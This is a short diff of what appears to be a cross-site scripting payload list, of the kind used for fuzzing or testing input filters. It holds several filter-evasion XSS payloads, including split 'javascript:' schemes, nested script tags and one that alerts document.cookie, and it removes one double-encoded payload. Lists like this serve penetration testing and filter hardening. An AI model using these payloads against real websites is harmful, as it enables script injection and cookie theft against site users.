@@ -215,7 +215,6 @@ http://www.<script>alert(1)</script .com
 <IMG SRC=”jav ascript:alert(‘XSS’);”>
 <IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
 <<SCRIPT>alert(“XSS”);//<</SCRIPT>
-%253cscript%253ealert(1)%253c/script%253e
 “><s”%2b”cript>alert(document.cookie)</script>
 foo<script>alert(1)</script>
 <scr<script>ipt>alert(1)</scr</script>ipt>
